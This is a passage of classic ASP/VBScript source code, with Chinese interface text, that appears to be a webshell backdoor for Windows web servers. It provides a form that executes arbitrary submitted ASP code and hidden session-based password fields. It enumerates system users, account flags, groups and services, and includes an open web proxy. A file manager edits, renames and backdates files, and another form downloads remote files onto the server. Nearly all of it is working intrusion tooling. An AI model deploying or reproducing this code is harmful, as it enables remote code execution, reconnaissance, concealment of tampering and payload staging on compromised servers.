	ShowTitle("登录成功")
	TopMenu()
End Sub

Function Encode(strPass)
	Dim i, theStr, strTmp

	For i = 1 To Len(strPass)
		strTmp = Asc(Mid(strPass, i, 1))
		theStr = theStr &amp; Abs(strTmp)
	Next

	strPass = theStr
	theStr = ""

	Do While Len(strPass) > 16
		strPass = JoinCutStr(strPass)
	Loop

	For i = 1 To Len(strPass)
		strTmp = CInt(Mid(strPass, i, 1))
		strTmp = IIf(strTmp > 6, Chr(strTmp + 60), strTmp)
		theStr = theStr &amp; strTmp
	Next

	Encode = theStr
End Function

Function JoinCutStr(str)
	Dim i, theStr
	For i = 1 To Len(str)
		If Len(str) - i = 0 Then Exit For
		theStr = theStr &amp; Chr(CInt((Asc(Mid(str, i, 1)) + Asc(Mid(str, i + 1, 1))) / 2))
		i = i + 1
	Next
	JoinCutStr = theStr
End Function

Sub PageExecute()
	Dim strAspCode
	strAspCode = GetPost("AspCode")
	ShowTitle("自定义ASP语句执行")

	If theAct = "Exe" Then
		Echo "&lt;table width=750 class=fixTable>"
		Echo "&lt;tr>"
		Echo "&lt;td class=trHead>&amp;nbsp;&lt;/td>"
		Echo "&lt;/tr>"
		Echo "&lt;tr>"
		Echo "&lt;td class=td>&lt;font face=webdings>8&lt;/font> 执行结果&lt;/td>"
		Echo "&lt;/tr>"
		Echo "&lt;tr>&lt;td style='padding-left:6px;padding-right:5px;'>"
		Execute(strAspCode)
		Echo "&lt;/td>&lt;/tr>&lt;/table>"
	End If
	ShowExeTable(strAspCode)
End Sub

Sub ShowExeTable(strAspCode)
	Echo "&lt;form method=post onsubmit=this.Submit.disabled=true; action=""" &amp; url &amp; """>" &amp; "&lt;input type=hidden name=""{$ThePass}"" value=Execute(Session(&amp;quot;{$ThePass}&amp;quot;))>"
	Echo Replace(sHeader, "{$s}", "自定义ASP语句执行")
	Echo "&lt;tr>"
	Echo "&lt;td valign=top width='10%'>"
	Echo "&amp;nbsp;ASP语句: "
	Echo "&lt;/td>"
	Echo "&lt;td>&amp;nbsp;"
	Echo "&lt;textarea name=AspCode cols=91 rows=23 title='By Marcos 2005.11'>" &amp; HtmlEncode(strAspCode) &amp; "&lt;/textarea>"
	Echo "&lt;/td>"
	Echo "&lt;/tr>"
	Echo "&lt;tr>"
	Echo "&lt;td class=trHead colspan=2>&amp;nbsp;&lt;/td>"
	Echo "&lt;/tr>"
	Echo "&lt;tr>"
	Echo "&lt;td align=center class=td colspan=2>"
	Echo "&lt;input type=hidden name=PageName value=PageExecute>"
	Echo "&lt;input type=hidden name=theAct value=Exe>"
	Echo "&lt;input type=submit name=Submit value=提交>"
	Echo "&lt;input type=reset value=重置>"
	Echo "&lt;/td>"
	Echo "&lt;/tr>"
	Echo "&lt;/table>"
	Echo "&lt;/form>"
End Sub

Sub PageUserList()
	Dim oUser, oGroup, oComputer
	
	ShowTitle("系统用户及用户组信息查看")
	Set oComputer = GetObject("WinNT://.")
	oComputer.Filter = Array("User")

	Echo Replace(sHeader, "{$s}", "系统用户信息查看")

	For Each oUser in oComputer
		Echo "&lt;tr class=td>&lt;td>&amp;nbsp;用户名:&lt;/td>&lt;td>&amp;nbsp;" &amp; oUser.Name &amp; "&lt;/td>&lt;/tr>"
		GetUserInfo(oUser.Name)
		Echo "&lt;tr>&lt;td class=trHead colspan=2>&amp;nbsp;&lt;/td>&lt;/tr>"
	Next
	Echo "&lt;tr>&lt;td align=right class=td colspan=2>Powered By Marcos 2005.11&amp;nbsp;&lt;/td>&lt;/tr>&lt;/table>"
	
	Echo "&lt;br />"
	Echo Replace(sHeader, "{$s}", "系统用户组查看")
	Echo "&lt;tr>&lt;td class=td>&amp;nbsp;组名&lt;/td>&lt;td>&amp;nbsp;组描述&lt;/td>&lt;/tr>"

	oComputer.Filter = Array("Group")
	For Each oGroup in oComputer
		Echo "&lt;tr>&lt;td style='padding-left:7px;'>" &amp; oGroup.Name &amp; "&lt;/td>"
		Echo "&lt;td style='padding-left:7px;'>" &amp; oGroup.Description &amp; "&lt;/td>&lt;/tr>"
	Next

	Echo sFooter
End Sub

Sub GetUserInfo(strUser)
	Dim User, Flags
	If isDebugMode = False Then
		On Error Resume Next
	End If
	Set User = GetObject("WinNT://./" &amp; strUser &amp; ",user")
	Echo "&lt;tr>&lt;td>&amp;nbsp;描述:&lt;/td>&lt;td>&amp;nbsp;" &amp; User.Description &amp; "&lt;/td>&lt;/tr>"
	Echo "&lt;tr>&lt;td>&amp;nbsp;所属用户组:&lt;/td>&lt;td>&amp;nbsp;" &amp; GetItsGroup(strUser) &amp; "&lt;/td>&lt;/tr>"
	Echo "&lt;tr>&lt;td>&amp;nbsp;密码已过期:&lt;/td>&lt;td>&amp;nbsp;" &amp; cbool(User.Get("PasswordExpired")) &amp; "&lt;/td>&lt;/tr>"
	Flags = User.Get("UserFlags")
	Echo "&lt;tr>&lt;td>&amp;nbsp;密码永不过期:&lt;/td>&lt;td>&amp;nbsp;" &amp; cbool(Flags And &amp;H10000) &amp; "&lt;/td>&lt;/tr>"
	Echo "&lt;tr>&lt;td>&amp;nbsp;用户不能更改密码:&lt;/td>&lt;td>&amp;nbsp;" &amp; cbool(Flags And &amp;H00040) &amp; "&lt;/td>&lt;/tr>"
	Echo "&lt;tr>&lt;td>&amp;nbsp;非全局帐号:&lt;/td>&lt;td>&amp;nbsp;" &amp; cbool(Flags And &amp;H100) &amp; "&lt;/td>&lt;/tr>"
	Echo "&lt;tr>&lt;td>&amp;nbsp;密码的最小长度:&lt;/td>&lt;td>&amp;nbsp;" &amp; User.PasswordMinimumLength &amp; "&lt;/td>&lt;/tr>"
	Echo "&lt;tr>&lt;td>&amp;nbsp;是否要求有密码:&lt;/td>&lt;td>&amp;nbsp;" &amp; User.PasswordRequired &amp; "&lt;/td>&lt;/tr>"
	Echo "&lt;tr>&lt;td>&amp;nbsp;帐号停用中:&lt;/td>&lt;td>&amp;nbsp;" &amp; User.AccountDisabled &amp; "&lt;/td>&lt;/tr>"
	Echo "&lt;tr>&lt;td>&amp;nbsp;帐号锁定中:&lt;/td>&lt;td>&amp;nbsp;" &amp; User.IsAccountLocked &amp; "&lt;/td>&lt;/tr>"
	Echo "&lt;tr>&lt;td>&amp;nbsp;用户信息文件:&lt;/td>&lt;td>&amp;nbsp;" &amp; User.Profile &amp; "&lt;/td>&lt;/tr>"
	Echo "&lt;tr>&lt;td>&amp;nbsp;用户登录脚本:&lt;/td>&lt;td>&amp;nbsp;" &amp; User.LoginScript &amp; "&lt;/td>&lt;/tr>"
	Echo "&lt;tr>&lt;td>&amp;nbsp;用户Home目录:&lt;/td>&lt;td>&amp;nbsp;" &amp; User.HomeDirectory &amp; "&lt;/td>&lt;/tr>"
	Echo "&lt;tr>&lt;td>&amp;nbsp;用户Home目录根:&lt;/td>&lt;td>&amp;nbsp;" &amp; User.Get("HomeDirDrive") &amp; "&lt;/td>&lt;/tr>"
	Echo "&lt;tr>&lt;td>&amp;nbsp;帐号过期时间:&lt;/td>&lt;td>&amp;nbsp;" &amp; User.AccountExpirationDate &amp; "&lt;/td>&lt;/tr>"
	Echo "&lt;tr>&lt;td>&amp;nbsp;帐号失败登录次数:&lt;/td>&lt;td>&amp;nbsp;" &amp; User.BadLoginCount &amp; "&lt;/td>&lt;/tr>"
	Echo "&lt;tr>&lt;td>&amp;nbsp;帐号最后登录时间:&lt;/td>&lt;td>&amp;nbsp;" &amp; User.LastLogin &amp; "&lt;/td>&lt;/tr>"
	Echo "&lt;tr>&lt;td>&amp;nbsp;帐号最后注销时间:&lt;/td>&lt;td>&amp;nbsp;" &amp; User.LastLogoff &amp; "&lt;/td>&lt;/tr>"
	For Each RegTime In User.LoginHours
		If RegTime &lt; 255 Then Restrict = True
	Next
	Echo "&lt;tr>&lt;td>&amp;nbsp;帐号已用时间:&lt;/td>&lt;td>&amp;nbsp;" &amp; Restrict &amp; "&lt;/td>&lt;/tr>"
	Err.Clear
End Sub

Function GetItsGroup(sUser)
	Dim oUser, oGroup
	Set oUser = GetObject("WinNT://./" &amp; sUser &amp; ",user")
	For Each oGroup In oUser.Groups
		GetItsGroup = GetItsGroup &amp; oGroup.Name &amp; " "
	Next
End Function

Sub PageServiceList()
	Dim oService, oComputer
	If isDebugMode = False Then On Error Resume Next
			
	ShowTitle("系统服务信息查看")
	Set oComputer = GetObject("WinNT://.")
	oComputer.Filter = Array("Service")

	Echo Replace(sHeader, "{$s}", "系统服务信息查看")

	For Each oService In oComputer
		Echo "&lt;tr class=td>&lt;td width=105>&amp;nbsp;服务名称: &lt;/td>&lt;td style='padding-left:7px;'>" &amp; oService.Name &amp; "&lt;/td>&lt;/tr>"
		Echo "&lt;tr>&lt;td>&amp;nbsp;显示名称: &lt;/td>&lt;td style='padding-left:7px;'>" &amp; oService.DisplayName &amp; "&lt;/td>&lt;/tr>"
		Echo "&lt;tr>&lt;td>&amp;nbsp;启动类型: &lt;/td>&lt;td style='padding-left:7px;'>" &amp; oGetStartType(oService.StartType) &amp; "&lt;/td>&lt;/tr>"
		Echo "&lt;tr>&lt;td>&amp;nbsp;运行状态: &lt;/td>&lt;td style='padding-left:7px;'>" &amp; oShl.IsServiceRunning(oService.Name) &amp; "&lt;/td>&lt;/tr>"
		Echo "&lt;tr>&lt;td>&amp;nbsp;登录身份: &lt;/td>&lt;td style='padding-left:7px;'>" &amp; oService.ServiceAccountName &amp; "&lt;/td>&lt;/tr>"
'			Echo "当前状态: " &amp; oService.Status &amp; "&lt;br/>"
'			Echo "服务类型: " &amp; oService.ServiceType &amp; "&lt;br/>"
		Echo "&lt;tr>&lt;td>&amp;nbsp;服务描述: &lt;/td>&lt;td class=fixTable style='padding-left:7px;'>" &amp; GetServiceDsc(oService.Name) &amp; "&lt;/td>&lt;/tr>"
		Echo "&lt;tr>&lt;td>&amp;nbsp;文件路径及参数: &lt;/td>&lt;td style='padding-left:7px;'>" &amp; oService.Path &amp; "&lt;/td>&lt;/tr>"
		Echo "&lt;tr>&lt;td class=trHead colspan=2>&amp;nbsp;&lt;/td>&lt;/tr>"
	Next
	
	Echo "&lt;tr>&lt;td align=right class=td colspan=2>Powered By Marcos 2005.11&amp;nbsp;&lt;/td>&lt;/tr>&lt;/table>"
End Sub

Function GetServiceDsc(sService)
	GetServiceDsc = oWshl.RegRead("HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\" &amp; sService &amp; "\Description")
End Function

Function GetStartType(n)
	Select Case n
		Case 2
			GetStartType = "自动"
		Case 3
			GetStartType = "手动"
		Case 4
			GetStartType = "已禁用"
	End Select
End Function

Sub PageWebProxy()
	Dim i, re, Html
	Response.Clear()
	If sUrl &lt;> "" Then Url = sUrl Else Url = Request.QueryString("url")
	If Url = "" Then Response.Redirect("?{$TheSharp}=Execute(Session(%22{$TheSharp}%22))&PageName=PageWebProxy&amp;url=http://hididi.net/")

	Set re = New RegExp
	re.IgnoreCase = True
	re.Global = True

	sUrlB = Url
	Html = getHTTPPage(Url)
	If sUrl &lt;> "" Then Echo Html:Response.End()
	Url = Left(Url, InStrRev(Url, "/"))

	i = InStr(sUrlB, "?")
	If i > 0 Then
		sUrlB = Left(sUrlB, i - 1)
	End If

	re.Pattern = "(href|action)=(\'|"")?(\?)"
	Html = re.Replace(Html,"$1=$2" &amp; sUrlB &amp; "?")

	re.Pattern = "(src|action|href)=(\'|"")?((http|https|javascript):[A-Za-z0-9\./=\?%\-&amp;_~`@[\]\':+!]+([^&lt;>""])+)(\'|"")?"
	Html = re.Replace(Html,"$1x=$2$3$2")

	re.Pattern = "(window\.open|url)\((\'|"")?((http|https):(\/\/|\\\\)[A-Za-z0-9\./=\?%\-&amp;_~`@[\]:+!]+([^\'&lt;>""])+)(\'|"")?\)"
	Html = re.Replace(Html,"$1x($2$3$2)")

	re.Pattern = "(src|action|href|background)=(\'|"")?([^\/""\'][A-Za-z0-9\./=\?%\-&amp;_~`@[\]:+!]+([^\'&lt;>""])+)(\'|"")?"
	Html = re.Replace(Html,"$1=$2" &amp; Url &amp; "$3$2")
	re.Pattern = "(src|action|href|background)=(\'|"")?\/([^""\'][A-Za-z0-9\./=\?%\-&amp;_~`@[\]:+!]+([^\'&lt;>""])+)(\'|"")?"
	Html = re.Replace(Html,"$1=$2http://" &amp; Split(Url, "/")(2) &amp; "/$3$2")
	re.Pattern = "(src|action|href)=(\'|"")?\/(\'|"")?"
	Html = re.Replace(Html,"$1=$2http://" &amp; Split(Url, "/")(2) &amp; "/$2")

	re.Pattern = "(window\.open|url)\((\'|"")?([^\/""\'http:][A-Za-z0-9\./=\?%\-&amp;_~`@[\]+!]+([^\'&lt;>""])+)(\'|"")?\)"
	Html = re.Replace(Html,"$1($2" &amp; Url &amp; "$3$2)")
	re.Pattern = "(window\.open|url)\((\'|"")?\/([^""\'http:][A-Za-z0-9\./=\?%\-&amp;_~`@[\]+!]+([^\'&lt;>""])+)(\'|"")?\)"
	Html = re.Replace(Html,"$1($2http://" &amp; Split(Url, "/")(2) &amp; "/$3$2)")

	Html = Replace(Html, "&amp;", "%26")
	Html = Replace(Html, "%26nbsp;", "&amp;nbsp;")
	Html = Replace(Html, "%26lt;", "&amp;lt;")
	Html = Replace(Html, "%26gt;", "&amp;gt;")
	Html = Replace(Html, "%26quot;", "&amp;quot;")
	Html = Replace(Html, "%26copy;", "&amp;copy;")
	Html = Replace(Html, "%26reg;", "&amp;reg;")
	Html = Replace(Html, "%26raquo;", "&amp;raquo;")
	Html = Replace(Html, "%26%26", "&amp;&amp;")
	Html = Replace(Html, "%26#", "&amp;#")

	re.Pattern = "(src|action|href)x=(\'|"")?((http|https|javascript):[A-Za-z0-9\./=\?%\-&amp;_~`@[\]\':+!]+([^&lt;>""])+)(\'|"")?"
	Html = re.Replace(Html, "$1=$2$3$2")

	re.Pattern = "((http|https):(\/\/|\\\\)[A-Za-z0-9\./=\?%\-&amp;_~`@[\]\':+!]+([^&lt;>""])+)"
	Html = re.Replace(Html, "?{$TheSharp}=Execute(Session(%22{$TheSharp}%22))&PageName=PageWebProxy&amp;url=$1")

	re.Pattern = "\?{$TheSharp}=Execute(Session(%22{$TheSharp}%22))&PageName=PageWebProxy&amp;url=" &amp; Url &amp; "(#|javascript:)"
	Html = re.Replace(Html, "$1")

	re.Pattern = "multipart\/form-data"
	Html = re.Replace(Html, "")

	re.Pattern = ">\?{$TheSharp}=Execute(Session(%22{$TheSharp}%22))&PageName=PageWebProxy&amp;url=((http|https|javascript):[A-Za-z0-9\./=\?%\-&amp;_~`@[\]\':+!]+([^&lt;>""])+)&lt;"
	Html = re.Replace(Html, ">$1&lt;")

	Echo Html
End Sub

Function GetHTTPPage(url)
	Dim Http, x, theStr, fileExt
	Set Http = Server.CreateObject("MSXML2.XMLHTTP")

	If Request.Form.Count > 0 Then
		For Each x In Request.Form
			theStr = theStr &amp; UrlEncode(x) &amp; "=" &amp; UrlEncode(Request.Form(x)) &amp; "&amp;"
		Next
		Http.Open "POST", url, False
		Http.SetRequestHeader "CONTENT-TYPE", "application/x-www-form-urlencoded"
		Http.Send(theStr)
	 Else
		Http.Open "GET", url, False
		Http.Send()
	End If

	If Http.ReadyState &lt;> 4 Then Exit Function

	fileExt = LCase(Mid(url, InStrRev(url, ".") + 1))
	If InStr("$jpg$gif$bmp$png$js$", "$" &amp; fileExt &amp; "$") > 0 Then
		Response.Clear
		Response.BinaryWrite Http.ResponseBody
		Response.End()
	 Else
		If InStr("$rar$mdb$zip$exe$com$ico$", "$" &amp; fileExt &amp; "$") > 0 Then
			Response.AddHeader "Content-Disposition", "Attachment; Filename=" &amp; Mid(sUrlB, InStrRev(sUrlB, "/") + 1)
			Response.BinaryWrite Http.ResponseBody
			Response.Flush
		 Else
			getHTTPPage = bytesToBSTR(Http.ResponseBody, "GB2312")
		End If
	End If

	Set Http = Nothing
End Function

Function bytesToBSTR(body,Cset)
	Dim objstream
	Set objstream = Server.CreateObject("adodb.stream")
	objstream.Type = 1
	objstream.Mode =3
	objstream.Open
	objstream.Write body
	objstream.Position = 0
	objstream.Type = 2
	objstream.Charset = Cset
	bytesToBSTR = objstream.ReadText 
	objstream.Close
	Set objstream = nothing
End Function

Sub PageApp()
	Server.ScriptTimeout = 600
	ShowTitle("Shell.Application与Stream组件文件浏览操作器")
	Select Case theAct
		Case "newone"
			sUrlB = GetPost("truePath") &amp; GetPost("Param")
			sUrlB = Left(sUrlB, Len(sUrlB) - 1)
			StreamSaveToFile(sUrlB)
		Case "rename"
			AppSetProperties("Name")
		Case "download"
			DownTheFile()
			Response.End()
		Case "showimage"
			ShowImage()
			Response.End()
		Case "showedit"
			StreamShowEdit()
			Response.End()
		Case "save"
			StreamSaveToFile("")
			StreamShowEdit()
			Response.End()
		Case "saveas"
			AppSaveAs("Copy")
		Case "move"
			AppSaveAs("Move")
		Case "lastmodify"
			AppSetProperties("LM")
	End Select
	
	AppFileExplorer()
End Sub

Sub AppFileExplorer()
	Dim sPath, oFolder, sFather, sFolderId, oMember, sFolderList, sFileList, sFileName, sFilePath, sExtName
	If thePath = "" Then thePath = rootPath
	Set oFolder = oShl.NameSpace(thePath)
	sFather = GetParentPath(thePath)

	Echo "&lt;form method=post action='" &amp; url &amp; "'>" &amp; "&lt;input type=hidden name=""{$ThePass}"" value=Execute(Session(&amp;quot;{$ThePass}&amp;quot;))>"
	Echo "&lt;input type=hidden name=theAct>"
	Echo "&lt;input type=hidden name=param>"
	Echo "&lt;input type=hidden value=PageApp name=PageName id=PageName />"
	Echo Replace(sHeader, "{$s}", "APP文件浏览操作器")
	Echo "&lt;td colspan=2>&amp;nbsp;"
	Echo "路径: &lt;input style='width:500px;' name=thePath value=""" &amp; HtmlEncode(thePath) &amp; """>"
	Echo "&lt;input type=hidden name=truePath value=""" &amp; HtmlEncode(thePath) &amp; "\"">"
	Echo " &lt;input type=button value='提交' onclick=Command('submit');>"
	Echo " &lt;input type=button value=上传 onclick=Command('upload')>"
	Echo " &lt;input type=button value=新文件 onclick=Command('newone','')>"
	Echo " &lt;a href=""javascript:changeThePath(&amp;#34;" &amp; Replace(rootPath, "\", "\\") &amp; "&amp;#34;);"">站点根&lt;/a>"
	Echo "&lt;/td>"
	Echo "&lt;/tr>"
	Echo "&lt;tr>&lt;td colspan=2 class=trHead>&amp;nbsp;&lt;/td>&lt;/tr>"
	Echo "&lt;tr>&lt;td valign=top colspan=2>"
	Echo "&lt;table width='99%' align=center>"
	Echo "&lt;tr>&lt;td colspan=4 class=trHead>&amp;nbsp;&lt;/td>&lt;/tr>&lt;tr class=td>&lt;td>"

	If sFather &lt;> "" Then
		If Left(sFather, 2) = "::" Then sFather = Left(sFather, Len(sFather) - 1)
		sFolderId = Replace(sFather, "\", "\\")
		Echo "&amp;nbsp;&lt;a href=""javascript:changeThePath(&amp;#34;" &amp; sFolderId &amp; "&amp;#34;);"">↑回上级目录&lt;/a>"
	End If
	Echo "&lt;/td>&lt;td align=center width=80>大小&lt;/td>"
	Echo "&lt;td align=center width=140>最后修改&lt;/td>&lt;td align=center>操作&lt;/td>&lt;/tr>"

	For Each oMember In oFolder.Items
		If oMember.IsFolder = True Then
			If Left(oMember.Path, 2) = "::" Then sPath = oMember.Path Else sPath = oMember.Path &amp; "\"
			sFolderId = Replace(sPath, "\", "\\")
			sFolderList = sFolderList &amp; "&lt;tr title=""" &amp; oMember.Name &amp; """>&lt;td>&amp;nbsp;&lt;font color=CCCCFF>■&lt;/font>"
			sFolderList = sFolderList &amp; "&lt;span class=fixSpan style='width:180;'>&lt;a href=""javascript:changeThePath(&amp;#34;" &amp; sFolderId &amp; "&amp;#34;);"">" &amp; oMember.Name &amp; "&lt;/a>&lt;/td>"
			sFolderList = sFolderList &amp; "&lt;td align=center>-&lt;/td>&lt;td align=center>" &amp; oFolder.GetDetailsOf(oMember, 3) &amp; "&lt;/td>&lt;td>"
			sFolderList = sFolderList &amp; "&lt;input type=button onclick=""Command('rename',&amp;#34;" &amp; oMember.Name &amp; "&amp;#34;);"" value='Ren' title=重命名>"
'				sFolderList = sFolderList &amp; "&lt;input type=button value='Move' title=移动 onclick=""Command('move',&amp;#34;" &amp; Replace(oMember.Path, "\", "\\") &amp; "&amp;#34;)"">"
'				sFolderList = sFolderList &amp; "&lt;input type=button value='SaveAs' title=另存为 onclick=""Command('saveas',&amp;#34;" &amp; Replace(oMember.Path, "\", "\\") &amp; "&amp;#34;)"">"
			sFolderList = sFolderList &amp; "&lt;input type=button value='LM' title=最后修改时间 onclick=""Command('lastmodify',&amp;#34;" &amp; oMember.Name &amp; "*" &amp; oFolder.GetDetailsOf(oMember, 3) &amp; "&amp;#34;)"">"
			sFolderList = sFolderList &amp; "&lt;/td>&lt;/tr>"
		Else
			sFilePath = oMember.Path
			sFileName = Mid(sFilePath, InStrRev(sFilePath, "\") + 1)
			sExtName = LCase(Mid(sFileName, InStrRev(sFileName, ".") + 1))
			If InStr(sFilePath, rootPath) > 0 Then
				sFolderId = Replace(Replace(Replace(UrlEncode(Mid(sFilePath, Len(rootPath) + 1)), "%2E", "."), "%5C", "/"), "+", "%20")
			Else
				sFolderId = "javascript:;"
			End If
			sFileList = sFileList &amp; "&lt;tr title=""" &amp; sFileName &amp; """>&lt;td>&amp;nbsp;&lt;font color=CCCCFF>□&lt;/font>"
			sFileList = sFileList &amp; "&lt;span class=fixSpan style='width:180;'>&lt;a href=""" &amp; sFolderId &amp; """" &amp; IIf(sFolderId = "javascript:;", "", "target='_blank'") &amp; ">" &amp; sFileName &amp; "&lt;/a>&lt;/td>"
			sFileList = sFileList &amp; "&lt;td align=center>" &amp; oFolder.GetDetailsOf(oMember, 1) &amp; "&lt;/td>&lt;td align=center>" &amp; oFolder.GetDetailsOf(oMember, 3) &amp; "&lt;/td>&lt;td>"

			If InStr(editableFileExt, "$" &amp; sExtName &amp; "$") > 0 Then
				sFileList = sFileList &amp; "&lt;input type=button value='Edit' title=编辑 onclick=""Command('showedit',&amp;#34;" &amp; sFileName &amp; "&amp;#34;);"">"
			End If
			If InStr(imageFileExt, "$" &amp; sExtName &amp; "$") > 0 Then
				sFileList = sFileList &amp; "&lt;input type=button value='View' title=查看图片 onclick=""Command('showimage',&amp;#34;" &amp; sFileName &amp; "&amp;#34;);"">"
			End If
			If sExtName = "mdb" Then
				sFileList = sFileList &amp; "&lt;input type=button value='Access' title=数据库操作 onclick=Command('access',""" &amp; sFileName &amp; """)>"
			End If
			sFileList = sFileList &amp; "&lt;input type=button value='D' title=下载 onclick=""Command('download',&amp;#34;" &amp; sFileName &amp; "&amp;#34;)"">"
			sFileList = sFileList &amp; "&lt;input type=button value='Ren' title=重命名 onclick=""Command('rename',&amp;#34;" &amp; sFileName &amp; "*" &amp; oMember.Name &amp; "&amp;#34;)"">"
'				sFileList = sFileList &amp; "&lt;input type=button value='S' title=另存为 onclick=""Command('saveas',&amp;#34;" &amp; Replace(oMember.Path, "\", "\\") &amp; "&amp;#34;)"">"
			sFileList = sFileList &amp; "&lt;input type=button value='LM' title=最后修改时间 onclick=""Command('lastmodify',&amp;#34;" &amp; sFileName &amp; "*" &amp; oFolder.GetDetailsOf(oMember, 3) &amp; "&amp;#34;)"">"
'				sFileList = sFileList &amp; "&lt;input type=button value='M' title=移动 onclick=""Command('move',&amp;#34;" &amp; Replace(oMember.Path, "\", "\\") &amp; "&amp;#34;)"">"
			sFileList = sFileList &amp; "&lt;/td>&lt;/tr>"
		End If
	Next
	
	Echo sFolderList &amp; sFileList
	Echo Replace(sFooter, "=2", "=4")
	Echo "&lt;/form>"
	
	Set oFolder = Nothing
End Sub

Function GetParentPath(sPath)
	Dim sFather
	If Right(sPath, 1) = "\" Then sFather = Left(sPath, Len(sPath) - 1) Else sFather = sPath
	If Len(sFather) = 2 Then
		GetParentPath = " "
	 Else
		GetParentPath = Left(sFather, InStrRev(sFather, "\"))
	End If
End Function

Function StreamSaveToFile(sPath)
	Dim oStream, sFileContent
	If isDebugMode = False Then On Error Resume Next
	If sPath = "" Then sPath = GetPost("truePath")
	sFileContent = GetPost("fileContent")

	Set oStream = Server.CreateObject("adodb.stream")
	With oStream
		.Type=2
		.Mode=3
		.Open
		ChkErr(Err)
		.Charset="gb2312"
		.WriteText sFileContent
		.saveToFile sPath, 2
		.Close
	End With
	Set oStream = Nothing
End Function

Sub StreamShowEdit()
	Dim sPath, sFileContent
	If isDebugMode = False Then On Error Resume Next
	sPath = GetPost("truePath") &amp; GetPost("param")
	sFileContent = StreamLoadFromFile(sPath)
	ChkErr(Err)

	Echo "&lt;form method=post action='" &amp; url &amp; "'>" &amp; "&lt;input type=hidden name=""{$ThePass}"" value=Execute(Session(&amp;quot;{$ThePass}&amp;quot;))>"
	Echo Replace(Replace(sHeader, "{$s}", "Stream文本编辑器"), "=2", "=1")
	Echo "&lt;input type=hidden name=theAct>"
	Echo "&lt;input type=hidden value=PageApp name=PageName>"
	Echo "&lt;tr>"
	Echo "&lt;td height=22>&amp;nbsp;&lt;input name=truePath value=""" &amp; sPath &amp; """ style=width:500px;>"
	Echo "&lt;input type=submit value=查看 onClick=this.form.theAct.value='showedit';>&lt;/td>"
	Echo "&lt;/tr>"
	Echo "&lt;tr>"
	Echo "&lt;td>&amp;nbsp;&lt;textarea name=fileContent style='width:735px;height:500px;'>"
	Echo HtmlEncode(sFileContent)
	Echo "&lt;/textarea>&lt;/td>"
	Echo "&lt;/tr>"
	Echo "&lt;tr>"
	Echo "&lt;td class=trHead>&amp;nbsp;&lt;/td>"
	Echo "&lt;/tr>"
	Echo "&lt;tr>"
	Echo "&lt;td class=td align=center>&lt;input type=button name=Submit value=保存 onClick=""if(confirm('确认保存修改?')){this.form.theAct.value='save';this.form.submit();}"">"
	Echo "&lt;input type=reset value=重置>&lt;input type=button onclick='window.close();' value=关闭>"
	Echo "&lt;input type=button value=预览 onclick=preView('1'); title='以HTML方式在新窗口中预览当前代码'>&lt;/td>"
	Echo "&lt;/tr>"
	Echo "&lt;/form>"
	Echo "&lt;/table>"
End Sub

Sub AppSaveAs(sFlag)
	Dim aParam, oTarFolder, sFileName, sFather
	If isDebugMode = False Then On Error Resume Next
	aParam = Split(GetPost("param"), ",")
	sFather = aParam(1)
	If Right(sFather, 1) = "\" And Len(sFather) > 3 Then
		sFather = Left(sFather, Len(sFather) - 1)
	Else
		sFather = GetParentPath(sFather)
		If Len(sFather) > 3 Then sFather = Left(sFather, Len(sFather) - 1)
	End If
	If Right(aParam(0), 1) = "\" And Len(aParam(0)) > 3 Then aParam(0) = Left(aParam(0), Len(aParam(0)) - 1)

	Set oTarFolder = oShl.NameSpace(sFather)
	If sFlag = "Copy" Then oTarFolder.CopyHere(aParam(0))
	If sFlag = "Move" Then oTarFolder.MoveHere(aParam(0))
	ChkErr(Err)
End Sub

Sub AppSetProperties(sFlag)
	Dim oItem, sPath, aParam, oFolder
	If isDebugMode = False Then On Error Resume Next
	aParam = Split(GetPost("param"), ",")
	sPath = GetPost("truePath")
	If Right(sPath, 1) = "\" And Len(sPath) > 3 Then sPath = Left(sPath, Len(sPath) - 1)

	Set oFolder = oShl.NameSpace(sPath)
	ChkErr(Err)

	Set oItem = oFolder.ParseName(aParam(0))
	ChkErr(Err)

	If aParam(1) &lt;> "" Then
		If sFlag = "Name" Then oItem.Name = aParam(1)
		If sFlag = "LM" And IsDate(aParam(1)) Then oItem.ModifyDate = aParam(1)
		ChkErr(Err)
	End If
	
	Set oItem = Nothing
	Set oFolder = Nothing
End Sub

Sub PageOtherTools()
	Dim theAct
	theAct = Request("theAct")

	ShowTitle("一些零碎的小东西")

	If theAct &lt;> "" Then Response.Clear
	Select Case theAct
		Case "DownFromUrl"
			DownFromUrl()
		Case "ReadReg"
			Response.Write("&lt;style>body{font-size:12px;}&lt;/style>" &amp; vbNewLine)
			ReadReg()
		Case "ReadRegX"
			Response.Write("&lt;style>body{font-size:12px;}&lt;/style>" &amp; vbNewLine)
			ReadRegX()
		Case "FileCombiner"
			If InStr(thePath, ":") &lt;= 0 Then thePath = Server.MapPath(thePath)
			FileCombiner(thePath)
			AlertThenClose("文件合并操作完成!")
	End Select
	If theAct &lt;> "" Then Response.End()

	Echo "&lt;form method=post action='' target=_blank>" &amp; "&lt;input type=hidden name=""{$ThePass}"" value=Execute(Session(&amp;quot;{$ThePass}&amp;quot;))>"
	Echo Replace(sHeader, "{$s}", "文件组合工具(程序不检查文件存在性)")
	Echo "&lt;tr>&lt;td colspan=2>&amp;nbsp;&lt;input size=80 name=thePath value=""F:\Tools\FileName_Blocks\FileName_5(最后一个文件的相对路径或者绝对路径)""/>"
	Echo "&lt;input type=hidden value=FileCombiner name=theAct>"
	Echo "&lt;input type=hidden value=PageOtherTools name=PageName>"
	Echo "&lt;input type=submit value='组 合'>&lt;/td>&lt;/tr>"
	Echo sFooter
	Echo "&lt;/form>"

	Echo "&lt;form method=post target=_blank>" &amp; "&lt;input type=hidden name=""{$ThePass}"" value=Execute(Session(&amp;quot;{$ThePass}&amp;quot;))>"
	Echo "&lt;input type=hidden value=PageOtherTools name=PageName>"
	Echo Replace(sHeader, "{$s}", "下载到服务器")
	Echo "&lt;tr>&lt;td colspan=2>&amp;nbsp;&lt;input name=theUrl value='http://' size=80>&lt;input type=submit value='下 载'>&lt;/td>&lt;/tr>"
	Echo "&lt;tr>&lt;td colspan=2>&amp;nbsp;&lt;input name=thePath value=""" &amp; HtmlEncode(Server.MapPath(".")) &amp; """ size=80>"
	Echo "&lt;input type=checkbox name=overWrite value=2>存在覆盖&lt;/td>&lt;/tr>"
	Echo "&lt;input type=hidden value=DownFromUrl name=theAct>"
	Echo sFooter
	Echo "&lt;/form>"
	
